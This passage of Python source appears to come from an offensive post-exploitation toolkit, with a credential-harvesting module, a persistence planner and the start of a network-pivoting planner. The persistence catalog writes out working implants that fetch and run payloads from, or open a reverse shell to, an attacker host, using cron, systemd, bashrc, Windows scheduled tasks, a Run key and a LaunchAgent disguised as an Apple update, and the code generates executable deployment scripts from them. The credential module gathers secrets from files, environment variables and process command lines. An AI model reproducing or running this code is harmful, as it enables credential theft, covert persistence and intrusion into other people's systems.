            stat_info = os.stat(resolved)
        except OSError as exc:
            warnings.append(f"{resolved}: {exc}")
            return None, warnings, 0
        if profile['rate_limiter']:
            profile['rate_limiter'].wait_if_needed()
        try:
            with open(resolved, 'rb') as fh:
                chunk = fh.read(profile['preview_bytes'])
        except (OSError, PermissionError) as exc:
            warnings.append(f"{resolved}: {exc}")
            return None, warnings, 0
        bytes_used = len(chunk)
        is_text = self._looks_like_text(chunk)
        if is_text:
            sample = chunk.decode('utf-8', errors='replace')
        else:
            sample = base64.b64encode(chunk).decode('ascii')
        preview = self._redact_secret_preview(sample, profile)
        confidence = self._score_secret_confidence(sample, profile)
        metadata = {
            'size': stat_info.st_size,
            'modified': stat_info.st_mtime,
            'mode': oct(stat_info.st_mode & 0o777),
            'is_text': is_text
        }
        candidates = self._detect_credentials_in_text(sample, profile)
        if candidates:
            metadata['credential_hits'] = len(candidates)
            confidence = 'high'
            self._maybe_store_credential_candidates(candidates, source['name'])
        artifact = CredentialArtifact(
            source=source['name'],
            category=source.get('category', 'misc'),
            path=resolved,
            artifact_type=source.get('artifact_type', 'file'),
            confidence=confidence,
            preview=preview[:profile['preview_bytes']],
            hash_preview=hashlib.sha256(chunk or b'').hexdigest(),
            metadata=metadata
        )
        return artifact, warnings, bytes_used

    def _looks_like_text(self, blob):
        if not blob:
            return True
        non_printable = sum(1 for byte in blob if byte < 9 or (byte > 13 and byte < 32))
        return (non_printable / len(blob)) < 0.3

    def _collect_directory_artifacts(self, source, profile):
        directory = os.path.expanduser(source['path'])
        artifacts = []
        warnings = []
        bytes_used = 0
        if self._should_skip_path(directory, profile['exclude_patterns']):
            return artifacts, warnings, bytes_used
        if not os.path.isdir(directory):
            warnings.append(f"Missing directory: {directory}")
            return artifacts, warnings, bytes_used
        entries = []
        try:
            with os.scandir(directory) as iterator:
                for entry in iterator:
                    entries.append(entry.name)
                    if entry.is_file() and source.get('patterns'):
                        if any(fnmatch.fnmatch(entry.name, pattern) for pattern in source['patterns']):
                            sub_source = {**source, 'paths': [entry.path], 'type': 'file', 'artifact_type': 'file'}
                            artifact, warn, consumed = self._collect_file_artifact(entry.path, sub_source, profile)
                            if artifact:
                                artifacts.append(artifact)
                            warnings.extend(warn)
                            bytes_used += consumed
                    if len(entries) >= profile['max_files_per_source']:
                        break
        except (OSError, PermissionError) as exc:
            warnings.append(f"{directory}: {exc}")
            return artifacts, warnings, bytes_used
        if entries:
            listing = '\n'.join(entries[:profile['max_files_per_source']])
            preview = self._redact_secret_preview(listing, profile)
            artifacts.append(CredentialArtifact(
                source=source['name'],
                category=source.get('category', 'directory'),
                path=directory,
                artifact_type='listing',
                confidence='info',
                preview=preview,
                hash_preview=hashlib.sha256(listing.encode('utf-8')).hexdigest(),
                metadata={'entries': len(entries)}
            ))
        return artifacts, warnings, bytes_used

    def _collect_env_artifacts(self, source, profile):
        artifacts = []
        warnings = []
        limit = profile['max_files_per_source']
        for key, value in os.environ.items():
            lower = key.lower()
            if any(keyword in lower for keyword in profile['secret_keywords']):
                preview = self._redact_secret_preview(value, profile)
                artifacts.append(CredentialArtifact(
                    source=source['name'],
                    category=source['category'],
                    path=f"env://{key}",
                    artifact_type='environment',
                    confidence='medium',
                    preview=preview,
                    hash_preview=hashlib.sha256(value.encode('utf-8', errors='ignore')).hexdigest(),
                    metadata={'length': len(value)}
                ))
                candidates = self._detect_credentials_in_text(value, profile)
                if candidates:
                    self._maybe_store_credential_candidates(candidates, f"env:{key}")
                if len(artifacts) >= limit:
                    break
        return artifacts, warnings

    def _collect_process_artifacts(self, source, profile):
        artifacts = []
        warnings = []
        if profile['target_os'] == 'windows':
            command = ['wmic', 'process', 'get', 'ProcessId,CommandLine']
        else:
            command = ['ps', '-eo', 'pid,command']
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=4, check=False)
        except (OSError, subprocess.SubprocessError) as exc:
            warnings.append(f"Process scan failed: {exc}")
            return artifacts, warnings
        hits = []
        for line in (result.stdout or '').splitlines():
            lowered = line.lower()
            if any(keyword in lowered for keyword in profile['secret_keywords']):
                hits.append(line.strip())
            if len(hits) >= profile['max_files_per_source']:
                break
        if hits:
            preview = self._redact_secret_preview('\n'.join(hits), profile)
            artifacts.append(CredentialArtifact(
                source=source['name'],
                category=source['category'],
                path='process://snapshot',
                artifact_type='process',
                confidence='medium',
                preview=preview,
                hash_preview=hashlib.sha256('\n'.join(hits).encode('utf-8')).hexdigest(),
                metadata={'matches': len(hits)}
            ))
        return artifacts, warnings

    def _redact_secret_preview(self, text, profile):
        snippet = text[:profile['preview_bytes']]
        if not profile['redact_samples']:
            return snippet
        redacted = snippet
        for pattern in profile['secret_patterns']:
            redacted = pattern.sub(lambda match: self._mask_secret_fragment(match.group(0)), redacted)
        return redacted

    @staticmethod
    def _mask_secret_fragment(secret):
        clean = secret.strip()
        if len(clean) <= 4:
            return '*' * len(clean)
        return f"{clean[:3]}***{clean[-2:]}"

    def _score_secret_confidence(self, text, profile):
        hits = sum(1 for pattern in profile['secret_patterns'] if pattern.search(text))
        if hits >= 2:
            return 'high'
        if hits == 1:
            return 'medium'
        return 'info'

    def _detect_credentials_in_text(self, text, profile):
        candidates = []
        for pattern in profile['credential_patterns']:
            for match in pattern.finditer(text):
                username = match.groupdict().get('username')
                password = match.groupdict().get('password')
                if password:
                    candidates.append((username or 'unknown', password))
        return candidates

    def _maybe_store_credential_candidates(self, candidates, source):
        for username, password in candidates:
            try:
                self.save_credential(username or 'unknown', password, source)
            except Exception:
                pass

    def _audit_credential_access(self, profile, artifact):
        audit_path = profile['audit_log']
        if not audit_path or str(audit_path).lower() in {'off', 'none'}:
            return
        entry = {
            'timestamp': self._utc_timestamp(),
            'session': profile['session_id'],
            'source': artifact.source,
            'path': artifact.path,
            'category': artifact.category,
            'confidence': artifact.confidence
        }
        try:
            with open(audit_path, 'a', encoding='utf-8') as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def _execute_credential_collection(self, profile, sources):
        start = time.time()
        artifacts = []
        warnings = []
        errors = []
        bytes_used = 0
        byte_budget_hit = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=profile['max_workers']) as executor:
            future_map = {executor.submit(self._collect_from_source, source, profile): source for source in sources}
            for future in concurrent.futures.as_completed(future_map):
                source = future_map[future]
                try:
                    result = future.result(timeout=profile['per_task_timeout'])
                except Exception as exc:
                    self.error_handler.handle_error(exc, f"Credential source {source['name']}")
                    errors.append(f"{source['name']}: {exc}")
                    continue
                warnings.extend(result.get('warnings', []))
                errors.extend(result.get('errors', []))
                bytes_used += result.get('bytes_used', 0)
                if bytes_used >= profile['max_total_bytes']:
                    byte_budget_hit = True
                for artifact in result.get('artifacts', []):
                    if len(artifacts) >= profile['max_artifacts']:
                        break
                    artifacts.append(artifact)
                    self._audit_credential_access(profile, artifact)
                if len(artifacts) >= profile['max_artifacts'] or byte_budget_hit:
                    break
        if byte_budget_hit:
            warnings.append('Byte budget reached; collection truncated')
        duration = time.time() - start
        summary = CredentialDumpSummary(
            session_id=profile['session_id'],
            target_os=profile['target_os'],
            mode=profile['mode'],
            total_artifacts=len(artifacts),
            categories=dict(Counter(artifact.category for artifact in artifacts)),
            warnings=len(warnings),
            errors=len(errors),
            duration=duration
        )
        return {'summary': summary, 'artifacts': artifacts, 'warnings': warnings, 'errors': errors, 'bytes_used': bytes_used}

    def _display_credential_results(self, profile, result):
        summary = result['summary']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}CREDENTIAL DUMPER SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target OS : {Fore.CYAN}{summary.target_os}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{summary.mode}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Artifacts : {Fore.CYAN}{summary.total_artifacts}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Runtime : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
        if summary.categories:
            top = ', '.join(f"{cat}:{count}" for cat, count in list(summary.categories.items())[:4])
            print(f"{Fore.WHITE} Categories : {Fore.CYAN}{top}{Style.RESET_ALL}")
        if result['warnings']:
            print(f"{Fore.YELLOW}[!] Warnings: {len(result['warnings'])}{Style.RESET_ALL}")
        if result['errors']:
            print(f"{Fore.RED}[!] Errors: {len(result['errors'])}{Style.RESET_ALL}")
        if result['artifacts']:
            print(f"\n{Fore.GREEN}[+] Notable artifacts{Style.RESET_ALL}")
            for artifact in result['artifacts'][:5]:
                print(f" {artifact.confidence.upper():<6} {artifact.category:<12} {artifact.source}")
                print(f" {artifact.path}")

    def _export_credential_results(self, profile, result):
        timestamp = int(time.time())
        base_name = f"{profile['report_prefix']}_{profile['session_id']}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        summary = result['summary']
        payload = {
            'summary': summary.__dict__,
            'artifacts': [artifact.to_dict() for artifact in result['artifacts']],
            'warnings': result['warnings'],
            'errors': result['errors']
        }
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(payload, fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("CREDENTIAL DUMP REPORT\n")
                fh.write(f"Generated: {self._utc_timestamp()}\n")
                fh.write(f"Session: {summary.session_id}\n")
                fh.write(f"Target OS: {summary.target_os}\n")
                fh.write(f"Mode: {summary.mode}\n")
                fh.write(f"Artifacts: {summary.total_artifacts}\n\n")
                for artifact in result['artifacts']:
                    fh.write(f"[{artifact.category}/{artifact.confidence}] {artifact.source}\n")
                    fh.write(f"Path: {artifact.path}\n")
                    fh.write(f"Preview: {artifact.preview}\n")
                    fh.write(f"Hash: {artifact.hash_preview}\n\n")
                if result['warnings']:
                    fh.write("Warnings:\n")
                    for warning in result['warnings']:
                        fh.write(f"- {warning}\n")
                if result['errors']:
                    fh.write("\nErrors:\n")
                    for error in result['errors']:
                        fh.write(f"- {error}\n")
            return [json_path, txt_path]
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting credential dump results")
            return []

    def run_credential_dumper(self):
        """Advanced credential harvesting pipeline"""
        profile = self._resolve_credential_profile()
        print(f"{Fore.CYAN}[*] Dumping credentials from session {profile['session_id']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target OS: {profile['target_os']} | Mode: {profile['mode']}{Style.RESET_ALL}")
        sources = self._build_credential_sources(profile)
        result = self._execute_credential_collection(profile, sources)
        self._display_credential_results(profile, result)
        report_paths = self._export_credential_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Credential dump reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        return result

    def _safe_command_template(self, template, params):
        safe_params = {}
        for key, value in params.items():
            text = str(value)
            sanitized = re.sub(r'[^A-Za-z0-9_./:@#\-]', '_', text)
            safe_params[key] = sanitized
        try:
            return template.format(**safe_params)
        except (KeyError, ValueError):
            return template

    def _resolve_persistence_profile(self):
        raw = self.module_options
        session_id = (raw.get('session') or getattr(self, 'session_id', '1') or '1').strip()
        mode = (raw.get('mode', 'balanced') or 'balanced').lower()
        mode_profiles = {
            'stealth': {'max_methods': 2, 'risk_ceiling': 'medium'},
            'balanced': {'max_methods': 4, 'risk_ceiling': 'high'},
            'aggressive': {'max_methods': 6, 'risk_ceiling': 'critical'}
        }
        defaults = mode_profiles.get(mode, mode_profiles['balanced'])
        method_tokens = [token.lower() for token in self._parse_list_option(raw.get('method', 'auto'))]
        methods = method_tokens or ['auto']
        target_os = self._detect_target_os((raw.get('os') or 'auto').strip().lower())
        include_cleanup = self._parse_bool_option(raw.get('include_cleanup', 'true'), True)
        generate_scripts = self._parse_bool_option(raw.get('generate_scripts', 'true'), True)
        script_dir = raw.get('script_dir', '').strip()
        audit_log = raw.get('audit_log', f"persistence_{session_id}_audit.log")
        lhost = raw.get('lhost', self.config.get('lhost', '127.0.0.1'))
        lport = raw.get('lport', str(self.config.get('lport', 4444)))
        max_methods = self._safe_int(raw.get('max_methods'), defaults['max_methods'], 1, 10)
        risk_ceiling = (raw.get('risk_ceiling') or defaults['risk_ceiling']).lower()
        risk_order = {'low': 0, 'medium': 1, 'high': 2, 'critical': 3}
        if risk_ceiling not in risk_order:
            risk_ceiling = defaults['risk_ceiling']
        profile = {
            'session_id': session_id,
            'mode': mode,
            'target_os': target_os,
            'methods': methods,
            'include_cleanup': include_cleanup,
            'generate_scripts': generate_scripts,
            'script_dir': script_dir,
            'audit_log': audit_log,
            'lhost': lhost,
            'lport': str(lport),
            'max_methods': max_methods,
            'risk_ceiling': risk_ceiling,
            'risk_order': risk_order,
            'report_prefix': raw.get('report_prefix', 'persistence_plan')
        }
        return profile

    def _get_persistence_catalog(self, profile):
        params = {
            'lhost': profile['lhost'],
            'lport': profile['lport'],
            'session': profile['session_id']
        }
        specs = [
            {
                'id': 'linux_cron_pull',
                'os': 'linux',
                'category': 'cron',
                'title': 'Cron Remote Loader',
                'description': 'Installs drop-in cron job that pulls signed payload every 30 minutes.',
                'risk': 'high',
                'commands': [
                    "cat <<'EOF' > /etc/cron.d/system_sync_{session}\n*/30 * * * * root /usr/bin/curl -fsSL http://{lhost}:{lport}/sync.sh | /bin/bash\nEOF",
                    "chmod 640 /etc/cron.d/system_sync_{session}",
                    "systemctl restart cron || service cron reload"
                ],
                'cleanup': [
                    "rm -f /etc/cron.d/system_sync_{session}",
                    "systemctl restart cron || service cron reload"
                ],
                'detection': [
                    'Monitor /etc/cron.d for unsigned entries.',
                    'Alert when curl/wget invoked from cron.'
                ],
                'prerequisites': ['Root or cron.d write access'],
                'automation': 'Drop-in file'
            },
            {
                'id': 'linux_systemd_watchdog',
                'os': 'linux',
                'category': 'systemd',
                'title': 'Systemd Resilient Service',
                'description': 'Creates a systemd service with restart and watchdog timers.',
                'risk': 'critical',
                'commands': [
                    "cat <<'EOF' > /etc/systemd/system/telemetry_{session}.service\n[Unit]\nDescription=Telemetry Bridge {session}\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\nRestart=always\nRestartSec=15s\nWatchdogSec=60s\n\n[Install]\nWantedBy=multi-user.target\nEOF",
                    "systemctl daemon-reload",
                    "systemctl enable --now telemetry_{session}.service"
                ],
                'cleanup': [
                    "systemctl disable --now telemetry_{session}.service",
                    "rm -f /etc/systemd/system/telemetry_{session}.service",
                    "systemctl daemon-reload"
                ],
                'detection': ['Audit systemd unit changes', 'Monitor unexpected outbound sockets'],
                'prerequisites': ['systemd, root access'],
                'automation': 'systemd unit'
            },
            {
                'id': 'linux_bashrc_implant',
                'os': 'linux',
                'category': 'userland',
                'title': 'Bashrc Command Stager',
                'description': 'Appends guarded on-login implant to user shell profile.',
                'risk': 'medium',
                'commands': [
                    "echo 'if [ -f ~/.cache/.session_{session} ]; then source ~/.cache/.session_{session}; else (curl -fsSL http://{lhost}:{lport}/profile.sh > ~/.cache/.session_{session} && chmod 600 ~/.cache/.session_{session}); fi' >> ~/.bashrc"
                ],
                'cleanup': [
                    "sed -i '/session_{session}/d' ~/.bashrc",
                    "rm -f ~/.cache/.session_{session}"
                ],
                'detection': ['Integrity monitor for user dotfiles'],
                'prerequisites': ['Interactive shell access'],
                'automation': 'profile hook'
            },
            {
                'id': 'windows_schtask_reverse',
                'os': 'windows',
                'category': 'scheduled_task',
                'title': 'Scheduled Task Callback',
                'description': 'Creates hidden scheduled task executing payload hourly.',
                'risk': 'high',
                'commands': [
                    "SCHTASKS /Create /SC HOURLY /RU SYSTEM /TN 'Telemetry_{session}' /TR 'powershell -WindowStyle Hidden -c \"Invoke-WebRequest http://{lhost}:{lport}/sync.ps1 -UseBasicParsing | Invoke-Expression\"' /F"
                ],
                'cleanup': ["SCHTASKS /Delete /TN 'Telemetry_{session}' /F"],
                'detection': ['Audit Microsoft-Windows-TaskScheduler/Operational log'],
                'prerequisites': ['Administrator context'],
                'automation': 'schtasks.exe'
            },
            {
                'id': 'windows_registry_run',
                'os': 'windows',
                'category': 'registry',
                'title': 'Run Key Launcher',
                'description': 'Adds obfuscated PowerShell loader to HKCU run key.',
                'risk': 'medium',
                'commands': [
                    "powershell -Command \"Set-ItemProperty -Path 'HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Telemetry_{session}' -Value 'powershell -WindowStyle Hidden -c (New-Object Net.WebClient).DownloadString(\'http://{lhost}:{lport}/stage.ps1\')'\""
                ],
                'cleanup': [
                    "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Telemetry_{session} /f"
                ],
                'detection': ['Monitor autorun keys'],
                'prerequisites': ['User context persistence'],
                'automation': 'registry'
            },
            {
                'id': 'mac_launchd_agent',
                'os': 'mac',
                'category': 'launchd',
                'title': 'LaunchAgent Loader',
                'description': 'LaunchAgent executing signed payload at login.',
                'risk': 'high',
                'commands': [
                    "cat <<'EOF' > ~/Library/LaunchAgents/com.apple.update.{session}.plist\n<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n<plist version='1.0'>\n<dict>\n <key>Label</key><string>com.apple.update.{session}</string>\n <key>ProgramArguments</key>\n <array><string>/bin/bash</string><string>-c</string><string>curl -fsSL http://{lhost}:{lport}/sync.sh | bash</string></array>\n <key>RunAtLoad</key><true/>\n <key>KeepAlive</key><true/>\n</dict>\n</plist>\nEOF",
                    "launchctl load ~/Library/LaunchAgents/com.apple.update.{session}.plist"
                ],
                'cleanup': [
                    "launchctl unload ~/Library/LaunchAgents/com.apple.update.{session}.plist",
                    "rm -f ~/Library/LaunchAgents/com.apple.update.{session}.plist"
                ],
                'detection': ['Monitor LaunchAgent directory'],
                'prerequisites': ['User with login sessions'],
                'automation': 'launchctl'
            }
        ]
        catalog = []
        for spec in specs:
            commands = [self._safe_command_template(cmd, params) for cmd in spec['commands']]
            cleanup = [self._safe_command_template(cmd, params) for cmd in spec['cleanup']]
            catalog.append(PersistenceTechnique(
                identifier=spec['id'],
                os_family=spec['os'],
                category=spec['category'],
                title=spec['title'],
                description=spec['description'],
                risk=spec['risk'],
                commands=commands,
                cleanup=cleanup,
                detection=spec['detection'],
                prerequisites=spec['prerequisites'],
                automation=spec['automation']
            ))
        return catalog

    def _select_persistence_techniques(self, profile, catalog):
        desired = set(profile['methods'])
        include_all = 'auto' in desired or 'any' in desired
        selected = []
        match_count = 0
        ceiling = profile['risk_order'][profile['risk_ceiling']]
        for technique in catalog:
            if technique.os_family != profile['target_os']:
                continue
            if not include_all and technique.category not in desired:
                continue
            risk_value = profile['risk_order'].get(technique.risk, max(profile['risk_order'].values()))
            if risk_value > ceiling:
                continue
            match_count += 1
            selected.append(technique)
        if len(selected) > profile['max_methods']:
            selected = selected[:profile['max_methods']]
        truncated = match_count > len(selected)
        return selected, truncated

    def _build_persistence_plan(self, profile):
        catalog = self._get_persistence_catalog(profile)
        selected, truncated = self._select_persistence_techniques(profile, catalog)
        warnings = []
        errors = []
        if not selected:
            warnings.append('No techniques matched the requested filters; adjust method or risk settings.')
        elif truncated:
            warnings.append('Results truncated by max_methods limit; increase limit to see more options.')
        plan = PersistencePlan(
            session_id=profile['session_id'],
            target_os=profile['target_os'],
            methods_requested=profile['methods'],
            techniques=selected,
            warnings=warnings,
            errors=errors,
            generated_at=self._utc_timestamp()
        )
        for technique in selected:
            self._audit_persistence_action(profile, technique)
        return plan

    def _display_persistence_plan(self, profile, plan):
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PERSISTENCE PLAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target OS : {Fore.CYAN}{plan.target_os}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Methods : {Fore.CYAN}{', '.join(plan.methods_requested)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Techniques : {Fore.CYAN}{len(plan.techniques)}{Style.RESET_ALL}")
        if plan.warnings:
            print(f"{Fore.YELLOW}[!] Warnings: {len(plan.warnings)}{Style.RESET_ALL}")
        if plan.errors:
            print(f"{Fore.RED}[!] Errors: {len(plan.errors)}{Style.RESET_ALL}")
        for technique in plan.techniques:
            print(f"\n{Fore.GREEN}[+] {technique.title}{Style.RESET_ALL} ({technique.risk.upper()} - {technique.category})")
            print(f" {technique.description}")
            print(f" Automation: {technique.automation}")
            for command in technique.commands[:3]:
                print(f" $ {command}")
            if profile['include_cleanup'] and technique.cleanup:
                print(f" Cleanup -> {technique.cleanup[0]}")
            if technique.detection:
                print(f" Detection hint: {technique.detection[0]}")

    def _export_persistence_plan(self, profile, plan):
        timestamp = int(time.time())
        base_name = f"{profile['report_prefix']}_{plan.session_id}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(plan.to_dict(), fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("PERSISTENCE PLAN\n")
                fh.write(f"Generated: {plan.generated_at}\n")
                fh.write(f"Session: {plan.session_id}\n")
                fh.write(f"Target OS: {plan.target_os}\n")
                fh.write(f"Requested methods: {', '.join(plan.methods_requested)}\n\n")
                for technique in plan.techniques:
                    fh.write(f"[{technique.category}/{technique.risk}] {technique.title}\n")
                    fh.write(f"Description: {technique.description}\n")
                    fh.write("Commands:\n")
                    for command in technique.commands:
                        fh.write(f" - {command}\n")
                    if profile['include_cleanup'] and technique.cleanup:
                        fh.write("Cleanup:\n")
                        for command in technique.cleanup:
                            fh.write(f" - {command}\n")
                    if technique.detection:
                        fh.write("Detection:\n")
                        for hint in technique.detection:
                            fh.write(f" - {hint}\n")
                    if technique.prerequisites:
                        fh.write("Prerequisites:\n")
                        for prereq in technique.prerequisites:
                            fh.write(f" - {prereq}\n")
                    fh.write("\n")
                if plan.warnings:
                    fh.write("Warnings:\n")
                    for warning in plan.warnings:
                        fh.write(f"- {warning}\n")
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting persistence plan")
            return []
        return [json_path, txt_path]

    def _generate_persistence_scripts(self, profile, plan):
        if not profile['generate_scripts'] or not plan.techniques:
            return []
        timestamp = int(time.time())
        base_dir = profile['script_dir'] or os.getcwd()
        try:
            os.makedirs(base_dir, exist_ok=True)
        except OSError as exc:
            self.error_handler.handle_error(exc, "Creating persistence script directory")
            return []
        suffix = '.ps1' if profile['target_os'] == 'windows' else '.sh'
        script_path = os.path.join(base_dir, f"persistence_{plan.session_id}_{timestamp}{suffix}")
        try:
            with open(script_path, 'w', encoding='utf-8') as fh:
                if suffix == '.sh':
                    fh.write('#!/bin/bash\nset -e\n')
                else:
                    fh.write('#requires -version 3\n')
                for technique in plan.techniques:
                    fh.write(f"\n# {technique.title}\n")
                    for command in technique.commands:
                        fh.write(f"{command}\n")
                    if profile['include_cleanup'] and technique.cleanup:
                        fh.write("# Cleanup commands\n")
                        for command in technique.cleanup:
                            fh.write(f"# {command}\n")
        except OSError as exc:
            self.error_handler.handle_error(exc, "Writing persistence script")
            return []
        if suffix == '.sh':
            try:
                os.chmod(script_path, 0o700)
            except OSError:
                pass
        return [script_path]

    def _audit_persistence_action(self, profile, technique):
        audit_path = profile['audit_log']
        if not audit_path or audit_path.lower() in {'none', 'off'}:
            return
        entry = {
            'timestamp': self._utc_timestamp(),
            'session': profile['session_id'],
            'technique': technique.identifier,
            'category': technique.category,
            'risk': technique.risk
        }
        try:
            with open(audit_path, 'a', encoding='utf-8') as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def run_persistence(self):
        """Advanced persistence planning toolkit"""
        profile = self._resolve_persistence_profile()
        plan = self._build_persistence_plan(profile)
        self._display_persistence_plan(profile, plan)
        report_paths = self._export_persistence_plan(profile, plan)
        script_paths = self._generate_persistence_scripts(profile, plan)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Persistence plan reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        if script_paths:
            print(f"{Fore.GREEN}[+] Deployment scripts generated:{Style.RESET_ALL}")
            for path in script_paths:
                print(f" • {path}")
        if not plan.techniques:
            print(f"{Fore.YELLOW}[!] No techniques selected; adjust filters and retry.{Style.RESET_ALL}")
        return plan
    
    def _sanitize_node_label(self, value, fallback='pivot-gateway'):
        if not value:
            return fallback
        sanitized = re.sub(r'[^A-Za-z0-9_.-]', '-', value.strip())
        return sanitized or fallback

    def _safe_network_range(self, raw_value, default='192.168.56.0/24'):
        try:
            network = ipaddress.ip_network(raw_value, strict=False)
            return str(network)
        except Exception:
            return default

    def _resolve_pivot_profile(self):
        raw = self.module_options
        session_id = (raw.get('session') or getattr(self, 'session_id', '1') or '1').strip()
        entry_host = self._sanitize_node_label(raw.get('entry_host', self.config.get('rhost', 'pivot-gateway')))
        entry_user = self._sanitize_node_label(raw.get('entry_user', 'pivot'))
        target_network = self._safe_network_range(raw.get('target', '192.168.2.0/24'))
        target_gateway = raw.get('target_gateway', '192.168.2.1')
        methods = self._parse_list_option(raw.get('method', 'auto')) or ['auto']
        transports = self._parse_list_option(raw.get('transport', 'auto')) or ['auto']
        platform = (raw.get('platform', 'linux') or 'linux').lower()
        max_routes = self._safe_int(raw.get('max_routes'), 4, 1, 8)
        bandwidth_pref = (raw.get('bandwidth', 'balanced') or 'balanced').lower()
        stealth_mode = self._parse_bool_option(raw.get('stealth', 'false'), False)
        generate_scripts = self._parse_bool_option(raw.get('generate_scripts', 'true'), True)
        script_dir = raw.get('script_dir', '').strip()
        audit_log = raw.get('audit_log', f"pivot_{session_id}_audit.log")
        local_port = str(self._safe_int(raw.get('local_port'), 8080, 1000, 65535))
        socks_port = str(self._safe_int(raw.get('socks_port'), 9050, 1000, 65535))
        chisel_port = str(self._safe_int(raw.get('chisel_port'), 8080, 1000, 65535))
        listener_port = str(self._safe_int(raw.get('listener_port'), 9001, 1000, 65535))
        wg_interface = self._sanitize_node_label(raw.get('wg_interface', 'pivotwg0'), 'pivotwg0')
        profile = {
            'session_id': session_id,
            'entry_host': entry_host,
            'entry_user': entry_user,
            'target_network': target_network,
            'target_gateway': target_gateway,
            'methods': [token.lower() for token in methods],
            'transports': [token.lower() for token in transports],
            'platform': platform if platform in {'linux', 'windows'} else 'linux',
            'max_routes': max_routes,
            'bandwidth_preference': bandwidth_pref if bandwidth_pref in {'low', 'balanced', 'high'} else 'balanced',
            'stealth_mode': stealth_mode,
            'generate_scripts': generate_scripts,
            'script_dir': script_dir,
            'audit_log': audit_log,
            'local_port': local_port,
            'socks_port': socks_port,
            'chisel_port': chisel_port,
            'listener_port': listener_port,
            'wg_interface': wg_interface,
            'lhost': self.config.get('lhost', '127.0.0.1'),
            'lport': str(self.config.get('lport', 4444))
        }
        return profile

    def _get_pivot_catalog(self, profile):
        params = {
            'entry_host': profile['entry_host'],
            'entry_user': profile['entry_user'],
            'target_gateway': profile['target_gateway'],
            'target_network': profile['target_network'],
            'local_port': profile['local_port'],
            'socks_port': profile['socks_port'],
            'chisel_port': profile['chisel_port'],
            'listener_port': profile['listener_port'],
            'wg_interface': profile['wg_interface'],
            'lhost': profile['lhost'],
            'lport': profile['lport']
        }
        specs = [
            {
                'id': 'ssh_local_forward',
                'category': 'ssh',
                'transport': 'tcp',
                'title': 'SSH Local Port Forward',
                'description': 'Expose internal services via local -L tunnels for tooling.',
                'risk': 'medium',
                'commands': [
                    "ssh -f -N -L {local_port}:{target_gateway}:3389 {entry_user}@{entry_host}",
                    "proxychains nmap -Pn {target_network}"
                ],
                'cleanup': [
                    "pkill -f '{entry_user}@{entry_host}.*{local_port}:{target_gateway}'"
                ],
                'detection': ['Monitor sshd config logs for -L usages'],
                'requirements': ['SSH credentials or keys', 'Network reachability to entry host'],
                'metrics': {'bandwidth': 'medium', 'latency': 'low', 'stealth': 'medium'}
            },
            {
                'id': 'ssh_dynamic_socks',
                'category': 'ssh',
                'transport': 'socks',
                'title': 'SSH Dynamic SOCKS',
                'description': 'Creates SOCKS5 proxy with -D for flexible pivoting.',
                'risk': 'low',
                'commands': [
                    "ssh -f -N -D {socks_port} {entry_user}@{entry_host}",
                    "export https_proxy=socks5://127.0.0.1:{socks_port}"
                ],
                'cleanup': [
                    "pkill -f '-D {socks_port}'"
                ],
                'detection': ['Alert on ssh clients with -D flag'],
                'requirements': ['OpenSSH client >=7.0'],
                'metrics': {'bandwidth': 'medium', 'latency': 'medium', 'stealth': 'high'}
            },
            {
                'id': 'chisel_reverse_tunnel',
                'category': 'chisel',
                'transport': 'tcp',
                'title': 'Chisel Reverse SOCKS',
                'description': 'HTTP-based reverse tunnel resilient to proxies.',
                'risk': 'high',
                'commands': [
                    "chisel server -p {chisel_port} --reverse",
                    "chisel client {entry_host}:{chisel_port} R:socks"
                ],
                'cleanup': [
                    "pkill -f 'chisel server'",
                    "pkill -f 'chisel client'"
                ],
                'detection': ['Inspect unusual HTTP long-lived connections'],
                'requirements': ['Upload rights on entry host'],
                'metrics': {'bandwidth': 'high', 'latency': 'low', 'stealth': 'medium'}
            },
            {
                'id': 'socat_tcp_proxy',
                'category': 'socat',
